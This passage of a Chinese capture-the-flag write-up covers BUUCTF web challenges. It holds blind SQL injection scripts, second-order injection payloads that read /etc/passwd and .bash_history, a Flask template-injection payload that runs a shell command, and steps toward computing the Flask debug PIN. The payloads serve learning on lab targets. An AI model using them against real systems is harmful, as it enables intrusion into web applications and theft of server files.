class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        data_register=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;123@%d&#x27;</span>%i,<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;0&#x27;+( substr(hex(hex((select * from flag ))) from (%d-1)*10+1 for 10))+&#x27;0&quot;</span>%i,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">        data_login=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;123@%d&#x27;</span>%i,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">        requests.post(register_url,data=data_register)</span><br><span class="line">        rr=requests.post(login_url,data=data_login)</span><br><span class="line">        rr.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        r=rr.text</span><br><span class="line">        location=r.find(<span class="string">&#x27;user-name&#x27;</span>)</span><br><span class="line">        cont=r[location+<span class="number">17</span>:location+<span class="number">42</span>].strip()</span><br><span class="line">        f.write(cont)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还有一种方法是结合limit offset进行盲注</p>
<p> *<em>select * from table limit 2 offset 1;*</em>      </p>
<p><strong>//含义是从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">db_name=<span class="string">&quot;&quot;</span></span><br><span class="line">url= <span class="string">&quot;http://7f01519f2fe14923acb0d2a096255f7302bd502b499a47ed.game.ichunqiu.com/register.php&quot;</span></span><br><span class="line">database=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">##当前数据库名长度##</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">148</span>):</span><br><span class="line">        db_payload=<span class="string">&quot;&#x27; or (case when ascii(mid((select * from flag limit 1 offset 0)from(%d)for(1)))=&#x27;%d&#x27; then sleep(3) else &#x27;b&#x27; end)=&#x27;a&quot;</span>%(a,i)</span><br><span class="line">        da=&#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;11@qq.com&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:db_payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&quot;11&quot;</span>&#125;</span><br><span class="line">        print(db_payload)</span><br><span class="line">        startTime=time.time()</span><br><span class="line">        r=requests.post(url,data=da,timeout=<span class="number">100</span>)</span><br><span class="line">        <span class="keyword">if</span> time.time()-startTime&gt;<span class="number">2</span>:</span><br><span class="line">            database+=<span class="built_in">chr</span>(i)</span><br><span class="line">            print(database)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(database)</span><br></pre></td></tr></table></figure>


<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>花了挺多时间的一题，学到了很多，很有必要详细记录一下</p>
<p>打开环境，发现是个留言板，想要发贴，需要先登入</p>
<blockquote>
<p>zhangwei</p>
<p>zhangwei666</p>
</blockquote>
<p>很明显的提示，直接猜中</p>
<p>看着留言板，第一感觉是sql注入 <del>，一直在找注入点，没找到</del>。后知后觉，还没扫源码<br>扫下源码 Git泄露，Githacker 恢复下，不过审计后发现代码不完整</p>
<blockquote>
<p>git log  –reflog<br>git reset  –hard  xxx</p>
</blockquote>
<p>用以上两个命令，得到完整代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>代码还是比较容易理解的，<del>其实审了好久</del></p>
<p>分为两块内容</p>
<ol>
<li><p>write</p>
<p>category 、content  、bo_id 经过 addslashes 转义后写入到数据库的 board 表中</p>
</li>
<li><p>comment</p>
<p>将 category 、content  、bo_id 写入到数据库的 comment 表中，不过在这一模块中只有 content  、bo_id是经过 addslashes 转义 的，而 category 则是从数据库的board表中读取我们在 write 模块中输入的内容，并没有经过 addslashes 转义</p>
</li>
</ol>
<p>通过审计可以发现存在二次注入</p>
<p>因为comment模块的 category 是我们在write模块写入的内容，而comment 却只显示 content 内容 （要注意虽然category 是经过 addslashes 转义后写入数据库的，但是取出时是没有被转义的，即没有反斜杠的），我们正是利用这一点进行的二次注入，</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">write</span>模块：title=<span class="number">1</span>&amp;category=<span class="string">&#x27;,content=(select load_file(&#x27;</span><span class="regexp">/etc/</span>passwd<span class="string">&#x27;)),/*&amp;content=111</span></span><br></pre></td></tr></table></figure>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">comment模块： $sql = &quot;<span class="keyword">insert</span> <span class="keyword">into</span> comment</span><br><span class="line">                <span class="keyword">set</span> category = <span class="string">&#x27;&#x27;</span>,content=(<span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>)),<span class="comment">/*&#x27;,</span></span><br><span class="line"><span class="comment">                content = &#x27;*/</span>#<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;</span>$bo_id<span class="string">&#x27;&quot;;</span></span><br></pre></td></tr></table></figure>
<p>注入原理如上  /**/是多行注释符   ， # 是单行注释符 </p>
<p>在提交留言的时候，提交<code>*/#</code>，这样就成功闭合了，而且将回显的内容放到了content（这里的content是 我们在write模块中写入的category中的content ）里，实现了注入。</p>
<p><del>经过漫长的爆库、报表、爆字段，结果发现flag不在数据库里…</del>正确做法如下：</p>
<p>1.读取一下<code>/etx/passwd</code>  payload: <code>&#39;,content=(select load_file(&#39;/etc/passwd&#39;)),/*</code> 得到了www的用户目录。</p>
<p><img src="http://img.npfs06.top/20210413232740.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">www:</span><span class="symbol">x:</span><span class="number">500</span><span class="symbol">:</span><span class="number">500</span><span class="symbol">:www</span><span class="symbol">:/home/www</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure>


<p><img src="http://img.npfs06.top/20210413232830.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们可以看到 www用户可以登录bash，www为普通用户，家目录为/home/www</p>
<ol start="2">
<li>.bash_history文件保存了当前用户使用过的历史命令。我们读取下这个文件 payload :<code>‘,content=(select load_file(‘//home/www/.bash_history’)),/*</code> 看用户的<strong>命令记录</strong></li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd <span class="regexp">/tmp/</span> unzip html.zip rm -f html.zip cp -r html <span class="regexp">/var/</span>www<span class="regexp">/ cd /</span>var<span class="regexp">/www/</span>html/ rm -f .DS_Store service apache2 start</span><br></pre></td></tr></table></figure>
<p>首先是cd到了/tmp/目录，然后unzip了html.zip，然后又把这个.zip文件删除了。然后又把解压得到的html这个文件夹复制到了/var/www/下面，然后又cd到了/var/www/html下，将.DS_Store给删除，然后开启apache2服务。</p>
<p>(这里删除的是/var/www/html下的.DS_Store，而/tmp/html下的.DS_Store没有被删除)</p>
<p>3.读取 /tmp/html下的.DS_Store 。payload: <code>&#39;, content=(select load_file(&#39;/tmp/html/.DS_Store&#39;)),/*</code></p>
<p>这里的话，又是一个知识点，按照上面这个payload我们发现是没有回显的，这个时候我们需要进行hex编码</p>
<ol start="4">
<li>payload：<code>&#39;, content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></li>
</ol>
<p><img src="https://img.npfs06.top/20210413232854.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>发现文件 flag_8946e1ff1ee3e40f.php</p>
<p>5.这里又是一个坑，我们要读取这个文件不能在/tmp目录下，而是要回到/var/www/html</p>
<p>最终payload :<code>&#39;, content=(select (load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p>
<p>最后一个坑，查看源码获得flag</p>
<h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>知识点：</p>
<ol>
<li>flask模板注入</li>
<li>RC4 加解密</li>
<li>PIN码</li>
</ol>
<p>解法一：</p>
<blockquote>
<p>Welcome To Find Secret</p>
</blockquote>
<p>访问 <a target="_blank" rel="noopener" href="http://url/secret">http://url/secret</a></p>
<blockquote>
<p>Tell me your secret.I will encrypt it so others can’t see</p>
</blockquote>
<p>访问 <a target="_blank" rel="noopener" href="http://url/secret/?secret=">http://url/secret/?secret=</a></p>
<p>输个大一点的secret值时，发现报错  比如?secret=11111</p>
<p>这个页面是flask应用开启了调试模式后运行错误的表现</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu10.jpg"></p>
<p>这段代码的意思是不存在变量secret时，返回Tell me your secret.I will encrypt it so others can’t see</p>
<p>否则对secret的值进行RC4加密，密钥为HereIsTreasure，再经由过程<code>render_template_string</code>履行</p>
<p>想到SSTI模板注入</p>
<p>注意下，这里的ciscn起过滤作用，只不过在buuctf的flag中没有ciscn字样所以该过滤没有起应有的作用</p>
<p><strong>这里我们需要对 RC4加密由一个大致的了解，RC4加密算法为对称加密算法，即明文经加密后得到密文，密文经加密后得到明文，就比如在这个页面  ?secret=1页面返回d  , 而  ?secret=d页面返回1</strong></p>
<p>对RC4加解密更详细的了解可以参考<a href="https://kabeor.cn/RC4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/#1-%E5%88%9D%E5%A7%8B%E5%8C%96" target="_blank">RC4加密算法及逆向方法初探</a></p>
<p>我们可以对poc 进行 RC4加密，加密脚本网上很多</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_message</span>():</span></span><br><span class="line">    print(<span class="string">&quot;输入你的信息：&quot;</span>)</span><br><span class="line">    s = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>():</span></span><br><span class="line">    print(<span class="string">&quot;输入你的秘钥：&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> key == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        key = <span class="string">&#x27;none_public_key&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_box</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    S盒</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) <span class="comment">#我这里没管秘钥小于256的情况，小于256应该不断重复填充即可</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment">#print(type(s_box)) #for_test</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ex_encrypt</span>(<span class="params">plain,box,mode</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    利用PRGA生成秘钥流并与密文字节异或，加解密同一个算法</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            c_mode = <span class="built_in">input</span>(<span class="string">&quot;输入你的解密模式:Base64 or ordinary\n&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> c_mode == <span class="string">&#x27;Base64&#x27;</span>:</span><br><span class="line">                plain = base64.b64decode(plain)</span><br><span class="line">                plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> c_mode == <span class="string">&#x27;ordinary&#x27;</span>:</span><br><span class="line">                plain = plain</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&quot;Something Wrong,请重新新输入&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    res = []</span><br><span class="line">    i = j =<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) %<span class="number">256</span></span><br><span class="line">        j = (j + box[i]) %<span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j])% <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s)^k))</span><br><span class="line"></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="comment">#print(cipher)</span></span><br><span class="line">    <span class="keyword">if</span>  mode == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="comment"># 化成可视字符需要编码</span></span><br><span class="line">        print(<span class="string">&quot;加密后的输出(没经过任何编码):&quot;</span>)</span><br><span class="line">        print(cipher)</span><br><span class="line">        print(<span class="string">&quot;url编码后：&quot;</span>)</span><br><span class="line">        print(parse.quote(cipher))</span><br><span class="line">        <span class="comment"># base64的目的也是为了变成可见字符</span></span><br><span class="line">        print(<span class="string">&quot;base64后的编码:&quot;</span>)</span><br><span class="line">        print(<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        print(<span class="string">&quot;解密后的密文：&quot;</span>)</span><br><span class="line">        print(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mode</span>():</span></span><br><span class="line">    print(<span class="string">&quot;请选择加密或者解密&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;1. Encrypt&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;2. Decode&quot;</span>)</span><br><span class="line">    mode = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        message = get_message()</span><br><span class="line">        key = get_key()</span><br><span class="line">        box = init_box(key)</span><br><span class="line">        ex_encrypt(message,box,mode)</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        message = get_message()</span><br><span class="line">        key = get_key()</span><br><span class="line">        box = init_box(key)</span><br><span class="line">        ex_encrypt(message, box, mode)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;输入有误！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        get_mode()</span><br></pre></td></tr></table></figure>


<p><strong>不过这里poc的生成还可以使用cyberchef工具，并不一定要写脚本</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu11.jpg"></p>
<p>payload:</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">////我们需要的是经RC4加密后再经过url编码过的（因为RC4加密后有不可见字符，所有进行url编码）</span></span><br><span class="line">.%14bh%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%91U%27%C2%B2m%C3%9F%3C5%C2%AE%2B%C2%9CP%C3%8F%3E%C3%A6%3E%C2%98H%C3%857%C3%8E%60%C2%AD%40%C2%8F%C3%94%C3%9F%231%C2%82%13%C2%AB%C2%B4RS%5D%C3%90mS%C2%A88D%C3%8B%C3%BE%01V%C3%B7%C2%95%15%C2%A9v%05%03%0A%C3%92%08%C3%A4%06%C3%A2i%C2%9AdM78V%C2%B0%C3%A9%1C%C2%85%C2%8D%C3%A1%C3%82%C3%B8%C2%80%C3%AAgu%C3%90%C3%85%C2%8D%C2%88%C3%A6wV%C3%A8%C2%96A%C2%BB%1D%1C%5D%C3%9A%C2%96%0D%7Ek%5Cj%C3%8C%C3%AD%C2%95j8%C2%AF%22%17U%C2%9Ef%C2%9C%08%C2%85%C3%96%C3%AB3%C3%AA%C3%A4%1C%27%C3%B8%C3%9A.%C2%87%24%04%11p%C3%87%C2%92</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>解法二：</p>
<p>前面的做法同解法一，从<a target="_blank" rel="noopener" href="http://url/secret?secret=11111">http://url/secret?secret=11111</a> 页面开始</p>
<p><strong>这个页面是flask应用开启了调试模式后运行错误的表现，在较旧版本的flask中可以直接在这个页面中打开python控制台运行代码，而在较新的版本中的flask中要打开python控制台需要输入一个pin码</strong>，如下：</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu12.jpg"></p>
<p><strong>pin码会在服务器端运行flask应用时输出，其格式为“ xxx-xxx-xxx”，其中x为任意一个数字，表示pin有10亿种组合。作为攻击者，我们目前是不知道pin编码的，除非你有耐性进行爆破，实际上爆破也是可行的，因为在固定的机器上，pin码是固定的</strong></p>
<p><strong>计算PIN码流程</strong>      <a href="https://xz.aliyun.com/t/2553" target="_blank">Flask debug pin安全问题</a></p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">需要六个数据来计算PIN码</span><br><span class="line"><span class="number">1</span>.username，读<span class="regexp">/etc/</span>passwd,本题为glzjin</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.module name 一般固定为flask.app</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.getattr(app, <span class="string">&quot;\_\_name\_\_&quot;</span>, app.\_\_class\_\_.\_\_name\_\_)的结果。就是Flask</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.flask库下app.py的绝对路径，不是当前运行的app.py的路径，在debug模式下报错就能直接看见，该题为<span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python2.<span class="number">7</span><span class="regexp">/site-packages/</span>flask/app.pyc</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.当前网络的mac地址的十进制数。通过文件<span class="regexp">/sys/</span><span class="keyword">class</span><span class="regexp">/net/</span>eth0/address读取，eth0为当前使用的网卡，如果有多个网卡数字可能会变，</span><br><span class="line"><span class="string">&#x27;class&#x27;</span> is not allowed. Secret is <span class="number">02</span>:<span class="number">42</span>:ac:<span class="number">10</span>:a6:<span class="number">56</span>  </span><br><span class="line">这里为<span class="number">02</span>:<span class="number">42</span>:ac:<span class="number">10</span>:a6:<span class="number">56</span> ，</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">print</span>(<span class="number">0</span>x0242ac10a656)</span><br><span class="line"><span class="number">2485377869398</span></span><br><span class="line">转十进制为 <span class="number">2485377869398</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>.机器的id</span><br><span 